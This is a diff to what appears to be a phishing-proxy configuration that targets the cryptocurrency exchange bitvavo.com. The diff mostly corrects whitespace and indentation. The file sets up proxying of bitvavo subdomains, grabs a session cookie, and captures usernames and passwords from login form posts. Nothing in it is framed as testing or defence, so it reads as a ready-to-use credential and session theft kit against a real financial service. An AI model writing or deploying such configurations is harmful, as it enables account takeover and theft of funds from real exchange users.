@@ -8,7 +8,6 @@ proxy_hosts:
   - {phish_sub: 'www2', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'edge', orig_sub: 'edge', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'ws', orig_sub: 'ws', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
-  
 
 sub_filters: # use sub_filters to change and modify content
   - {triggers_on: 'bitvavo.com', orig_sub: '', domain: '', search: 'login', replace: 'Test', mimes: ['text/html', 'application/json', 'application/javascript']}
@@ -18,7 +17,8 @@ auth_tokens: # Look for tokens in cookies sent from the server through Set-Cooki
   - domain: '.bitvavo.com'
     keys: ['__cf_bm']
     type: 'cookie'
-  credentials:
+
+credentials:
   username:
     key: 'username'
     search: '(.*)'
@@ -27,6 +27,7 @@ auth_tokens: # Look for tokens in cookies sent from the server through Set-Cooki
     key: 'password'
     search: '(.*)'
     type: 'post'
+
 login:
   domain: 'bitvavo.com'
   path: '/en'
